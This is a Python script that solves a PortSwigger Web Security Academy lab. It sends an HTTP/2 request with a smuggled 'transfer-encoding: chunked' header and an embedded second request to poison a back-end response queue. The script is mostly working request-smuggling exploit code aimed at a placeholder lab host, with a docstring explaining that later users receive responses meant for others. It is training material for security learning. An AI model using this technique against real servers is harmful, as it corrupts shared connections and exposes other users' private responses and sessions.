"""
Lab 14: Response queue poisoning via H2.TE request smuggling
https://portswigger.net/web-security/request-smuggling/advanced/h2-te-request-smuggling
Difficulty: Practitioner

📝 Transfer-Encoding is explicitly FORBIDDEN as a header in HTTP/2 itself —
but if the downgrade step blindly carries over a 'transfer-encoding: chunked'
header we smuggle through anyway, the resulting HTTP/1.1 request to the
back-end has BOTH an implicit framing (from the h2 DATA frame) and this
illegitimate TE header — causing the back-end to misparse where this
request ends, which desyncs the RESPONSE queue for every later request on
that connection (later users get responses meant for someone else).

Requires: pip install h2 --break-system-packages
"""

from utils import open_h2_via_burp, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"


def run():
    tls_sock, conn = open_h2_via_burp(HOST)

    # h2 forbids sending a literal 'transfer-encoding' header via its normal
    # validation in many versions — some forks/configs allow it through.
    # If this raises a ProtocolError, that confirms the client-side library
    # itself is enforcing the very rule we're trying to violate server-side;
    # Burp's raw HTTP/2 message editor bypasses this validation entirely.
    headers = [
        (":method", "POST"),
        (":authority", HOST),
        (":scheme", "https"),
        (":path", "/"),
        ("transfer-encoding", "chunked"),
    ]

    body = b"0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X\r\n\r\n"

    stream_id = conn.get_next_available_stream_id()
    try:
        conn.send_headers(stream_id, headers, end_stream=False)
        conn.send_data(stream_id, body, end_stream=True)
        tls_sock.sendall(conn.data_to_send())
        log("Sent request with smuggled transfer-encoding header.")
    except Exception as e:
        log(f"h2 library rejected the header client-side: {e}", ok=False)
        note("This is expected with a spec-compliant library. Recreate this")
        note("request in Burp Repeater (switch the request to HTTP/2, use")
        note("'Inspector' to add the raw transfer-encoding header, which Burp")
        note("permits even though it's protocol-illegal) to actually test it.")
        return

    tls_sock.settimeout(5)
    try:
        while True:
            data = tls_sock.recv(4096)
            if not data:
                break
            for event in conn.receive_data(data):
                log(f"Event: {event}")
    except Exception as e:
        log(f"Read loop ended: {e}")


if __name__ == "__main__":
    run()
